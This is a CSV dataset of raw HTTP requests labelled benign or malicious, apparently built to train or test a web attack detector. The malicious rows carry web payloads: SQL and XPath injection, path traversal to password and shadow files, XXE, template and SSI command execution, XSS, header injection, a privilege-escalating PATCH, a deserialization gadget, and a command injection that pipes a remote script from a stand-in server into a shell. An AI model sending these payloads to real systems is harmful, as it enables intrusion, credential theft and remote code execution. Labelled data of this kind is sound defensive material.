label,text
benign,"POST /user/contact HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 102
Connection: close
Cookie: authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
X-CSRF-Token: c9d89ddc-3bc6-48b3-9a97-2f09e8e83d59
Referer: https://secure-user-portal.net/profile/settings

name=RebeccaW&email=rebecca.williams%40securemail.net&comments=SSBsb3ZlIGhvd2lnbHkgdGhlIHNlcnZpY2UgaXMgaW1wbGVtZW50ZWQh"
benign,"POST /register/user HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept: application/json
Origin: https://community.game-dev-forum.org
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Content-Length: 181

{""username"":""violetbayliss"",""email"":""violet.bayliss@gamedf.org"",""password"":""Q3kp@sd9eMz"",""favoriteGameGenres"":[""RPG"",""Strategy""],""marketingEmails"":true,""agreeTerms"":true}"
malicious,"PATCH /api/v3/customers/99324/details HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Ijk5MzI0Iiwicm9sZSI6InVzZXIiLCJhbGciOiJIUzI1NiJ9.D1UjV_H4do_KC3o98AxHgZP8VmDQHoTMqjxvDbEeGJc
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.5
Pragma: no-cache
Content-Length: 247

{
  ""user_details"": {
    ""username"": ""hacker77"",
    ""email"": ""hacker77@examplemail.net""
  },
  ""account_info"": {
    ""status"": ""active"",
    ""permissions"": {
      ""can_edit_posts"": true,
      ""admin_override"": {
        ""is_admin"": true,
        ""moderation_level"": 9
      }
    }
  }
}"
malicious,"POST /api/v1/resources/query HTTP/1.1
Host: online-retail-store.biz
User-Agent: Wget/1.21.1 (linux-gnu)
Accept-Encoding: gzip
Accept: application/xml
Content-Type: application/xml
Content-Length: 153
Cache-Control: max-age=0

<searchRequest>
  <term>' or '1'='1' or name()='</term>
  <category>inventory</category>
</searchRequest>"
benign,"GET /api/v4/user/profile HTTP/1.1
Host: api.secure-user-portal.net
Accept: application/json
X-Requested-With: XMLHttpRequest
Authorization: Bearer c8a7d59f3bfa4e2791a7d3e507bc4d82
Origin: https://secure-user-portal.net
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9"
malicious,"GET /download?file=../../../../../../../../etc/passwd HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Origin: https://secure-user-portal.net
Connection: keep-alive"
benign,"POST /user/login HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Referer: https://secure-user-portal.net/user/login
Cookie: sessionid=e4bf7292de68f2b4; csrf_token=92f09a71
Accept: application/json, text/plain, */*
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0

email=laurence.choi%40webmail.com&password=GentleBear2023!"
benign,"GET /forums/thread/2135 HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.9
Cookie: view_opts_b64=eyJsYXlvdXQiOiJkYXJrIiwibGltaXQiOjUwfQ==; logged_in=true
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
benign,"GET /profile/view?id=7325 HTTP/1.1
Host: creativephotographers-community.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.8
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
benign,"GET /api/v1/reports/summary?token=c2VjdXJlX2VtYWlsX2ZpbHRlcg==&config=eyJsaW1pdCI6MjAsIm9yZGVyIjoiZGVzYyJ9 HTTP/1.1
Host: analytics-data-cloud.ai
Accept: application/json
User-Agent: curl/7.79.1
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"PATCH /api/search/items HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 310
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Origin: https://my-personal-blog-site.info
X-Requested-With: FetchAPIClient
Accept: application/json
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache

{""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""search_key"", ""category"": ""tech"", ""max_results"": 25}"
benign,"GET /news/latest/2024/04/20 HTTP/1.1
Host: global-tech-insights.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Cache-Control: max-age=600"
benign,"GET /blog/technology/latest-updates HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml
DNT: 1
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Referer: https://my-personal-blog-site.info/"
benign,"POST /accounts/newsletter/subscribe HTTP/1.1
Host: holistic-health-harbor.club
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive

email=nadia.karim%40healthmail.club"
benign,"GET /news/health/advances-in-medicine-2024 HTTP/1.1
Host: medpulse-research.org
User-Agent: Twitterbot/1.0
Accept: text/html,application/xhtml+xml;q=0.9
Referer: https://medpulse-research.org
Accept-Encoding: gzip
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"POST /api/v1/orders/new HTTP/1.1
Host: shoptech-global.net
Content-Type: application/json
Content-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

{""customerId"":74219,""items"":[{""productId"":9932,""quantity"":1},{""productId"":3721,""quantity"":3}],""paymentMethod"":""credit_card"",""shippingAddress"":{""line1"":""789 Maple Ave"",""city"":""Springfield"",""state"":""IL"",""zip"":""62704""}}"
malicious,"POST /service/api/xml/submit HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/xml
Accept-Language: en-US,en;q=0.5
Content-Length: 219

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE pet [
  <!ELEMENT pet ANY >
  <!ENTITY localfile SYSTEM ""file:///etc/hostname"" >
]>
<pets>
  <petId>&localfile;</petId>
  <desc>New game release</desc>
</pets>"
malicious,"GET /app/media?image=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afproc%c0%afself%c0%afenviron HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://online-retail-store.biz/shop/cart
Connection: keep-alive"
benign,"POST /oauth/token HTTP/1.1
Host: authhealth.medical-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 119
Authorization: Basic bWVkaWNhdXRoOnNlY3JldF9hcGk=
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Accept: application/json
Connection: keep-alive

grant_type=authorization_code&code=90bde4a7fc1eb239&redirect_uri=https%3A%2F%2Fauthhealth.medical-services.ai%2Fcallback&client_id=medicauth&client_secret=secret_api"
benign,"PUT /usr/data/records/5498 HTTP/1.1
Host: secure-data-retention.io
Authorization: Bearer 0e2fa04354ffc972f473a79b8c44c8c2
Content-Type: application/json
Accept: application/json
Origin: https://portal.secure-data-retention.io
X-Requested-With: XMLHttpRequest
User-Agent: curl/7.79.1
Content-Length: 56
Connection: keep-alive

{""archiveStatus"":""completed"",""retentionPeriod"":""5_years""}"
malicious,"POST /api/v1/file/load HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 28
Connection: keep-alive

{""filePath"": ""/etc/shadow""}"
benign,"GET /docs/api/v4/users/list HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
X-Forwarded-For: 192.168.172.20
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: keep-alive
Accept-Language: en-US,en;q=0.9
Pragma: no-cache"
malicious,"GET /app/user/settings/%7B%7B%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()%20%7D%7D HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
Cache-Control: no-cache
Pragma: no-cache
Connection: close"
malicious,"POST /api/executeTask HTTP/1.1
Host: control-node.central-iot.solutions
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 128
Connection: keep-alive

{""taskId"":""update_firmware"",""targetHost"":""192.168.5.10 && curl http://malicious-server.net/exploit.sh | sh"",""priority"":7}"
malicious,"POST /v1/serialize HTTP/1.1
Host: interactive-serialization.io
User-Agent: Java/1.8.0_291
Content-Type: application/json
Accept: */*
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 298

{
  ""b64_java_object"": ""rO0ABXNyABtqYXZhLmxhbmcuUnVudGltZQAAAAAAAAABAgAAFw==org.apache.commons.collections.functors.InvokerTransformerjava.lang.Runtime.exec""
}"
malicious,"POST /api/v1/user/login HTTP/1.1
Host: accounts.online-retail-store.biz
Content-Type: application/json
Content-Length: 107
Accept: application/json
X-CSRF-Token: ac1ed3f601d9442da249f077a046d7a3
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1

{""username"": ""shopper42"", ""password"": ""p@ssword123' oR 1=1--""}"
benign,"PUT /api/data/item123 HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: text/plain
Content-Length: 33
Accept-Encoding: deflate, gzip
Connection: keep-alive
X-CSRF-Token: c4f3d2e1b5a79e4d6f8c

Configuration value has been set."
benign,"GET /avatars/svg/usermode/profile-897.avif HTTP/1.1
Host: freelancing-projects-sandbox.dev
Accept: image/avif,image/webp,*/*
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip
DNT: 1
Connection: keep-alive"
benign,"POST /documents/upload HTTP/1.1
Host: enterprise-hr-service.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: application/pdf,application/msword
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data; boundary=BoundaryHRDocs
Content-Length: 318
Connection: keep-alive
Referer: https://enterprise-hr-service.com/documents

--BoundaryHRDocs
Content-Disposition: form-data; name=""file""; filename=""annual_report.docx""
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document

PK"
benign,"POST /register/new-user HTTP/1.1
Host: virtual-edu-portal.edu
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Referer: https://virtual-edu-portal.edu/register/new-user
Origin: https://virtual-edu-portal.edu
Cookie: eduportal_sid=cd146a975902fb183e0b2f6a
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept-Encoding: gzip, deflate
Connection: keep-alive

username=isabella.reed&email=isabella.reed%40edumail.org&password=Sunrise2023&password_confirm=Sunrise2023&terms_accepted=true"
benign,"GET /api/xml/resources/events?date=2024-06-01 HTTP/1.1
Host: event-streaming-service.biz
Authorization: Bearer a3ee4b60-b042-4b2f-b0b7-32d18c2e7514
Accept: application/xml
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Cache-Control: max-age=3600"
benign,"GET /graphics/animated/load-indicator.gif HTTP/1.1
Host: campus-elearning-platform.edu
Accept: image/gif,image/jpeg,image/png,image/*;q=0.8
Referer: https://campus-elearning-platform.edu/courses/course-234/lecture/12
User-Agent: curl/7.86.0
Connection: close"
benign,"GET /library/catalog?query=scientific+journals+on+marine+biodiversity+and+climate+change+effects+published+in+the+last+five+years+peer-reviewed HTTP/1.1
Host: oceanic-research-library.ai
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Cache-Control: no-cache
Connection: close"
malicious,"GET /api/v3/search/item%0d%0aX-Custom-Injected:%20HeaderInjection%0d%0a%0d%0a<script>alert(12345)</script> HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /user/messages/unread?folder=important HTTP/1.1
Host: mail-cloud-services.ai
Accept: application/json, text/plain, */*
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
User-Agent: python-requests/2.28.2
X-Forwarded-For: 203.0.113.195
Connection: close"
malicious,"GET /public/site.shtml?template_name=default<!--#exec cmd=""/bin/uname -a""--> HTTP/1.1
Host: portal-dev-services.net
User-Agent: Lynx/2.8.9dev.15 libwww-FM/2.14
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Charset: UTF-8,ISO-8859-1;q=0.5
Cache-Control: no-cache
Connection: keep-alive"
malicious,"GET /profile/view/<ImG sRc=x oNeRrOr=prompt(1)>/stats HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://secure-user-portal.net/dashboard
Connection: keep-alive"
benign,"GET /v3/user/profile?session=YXBpS2V5MTIzNDU2&prefs=eyJjb2xvciI6ImxpZ2h0IiwidWlkIjoxMjM0NX0= HTTP/1.1
Host: personalized-content-delivery.co.uk
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: keep-alive
Accept-Language: en-US,en;q=0.8"
benign,"GET /shop/cart?cmd=view_details&session=2a3d5e7f HTTP/1.1
Host: online-retail-store.biz
Accept: text/html
Accept-Language: en-US,en;q=0.9,fr;q=0.8
Cookie: sessionID=2a3d5e7f; userPref=darkMode%3Dfalse
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Referer: https://online-retail-store.biz/shop/products/electronics"
benign,"GET /atomfeed HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: application/atom+xml, application/xml;q=0.8
Referer: https://community.game-dev-forum.org/forums/discussion/2448
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9"
